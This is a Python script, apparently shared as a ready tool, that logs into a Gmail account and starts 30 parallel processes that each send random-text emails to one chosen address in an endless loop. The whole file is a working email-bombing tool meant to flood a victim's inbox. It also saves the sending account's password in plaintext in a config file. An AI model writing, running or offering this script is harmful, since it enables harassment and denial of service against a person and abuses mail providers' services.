# ==============================================
#
#          File name: emailSpammer.py
#               Made by: ALBIONE
#
# ==============================================
import smtplib
import random
import string
import multiprocessing

textQ = [1, 2, 3, 4, 5]

def email_spammer(server_email, password_email, to_email, emails_Sent):

    while True:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(server_email, password_email)

        chars = string.ascii_lowercase + string.digits
        randomChar = ''.join(random.choice(chars) for _ in range(7))
        randomBody = ''.join(random.choice(chars) for _ in range(7))

        msg = f'Subject: {randomChar}\n\n{randomBody}'
        server.sendmail(
            server_email,
            to_email,
            msg)

        emails_Sent.value += 1
        print(f"({emails_Sent.value}) Email has been sent!")

        server.quit()

def loadtask(to_email, server_email, password_email):
    emails_Sent = multiprocessing.Value('i', 0)

    for p in range(30):
        multiprocessing.Process(target=email_spammer, args=(server_email, password_email, to_email, emails_Sent)).start()

def mainFunc():

    try:
        filetxt = open('config.txt', 'r')
        print("Config loaded")

        lines = filetxt.readlines()

        server_email = lines[0]
        password_email = lines[1]


    except IOError:

        print("Config doesn't exist")
        print("""Would you like to create config file?
        [1] YES
        [2] NO
    
        [9] QUIT """)
        option = int(input("What is your choice?: "))

        if option == 1:
            server_email = input("Please add an email that will be used to send email: ")
            password_email = input('Please add a password that will be used to access the email: ')

            try:
                config = open('config.txt', 'x')
                print("Config saved")
                f = open('config.txt', 'a')
                f.write(server_email + "\n")
                f.write(password_email + "\n")
                f.close()
            except IOError:
                print('Config file already exists')


        elif option == 2:
            quit()

        elif option == 9:
            quit()
        else:
            print("INVALID INPUT")

    to_email = input('Please add an email that the messages will be delivered to: ')

    loadtask(to_email, server_email, password_email)

if __name__ == '__main__':
    multiprocessing.freeze_support()
    mainFunc()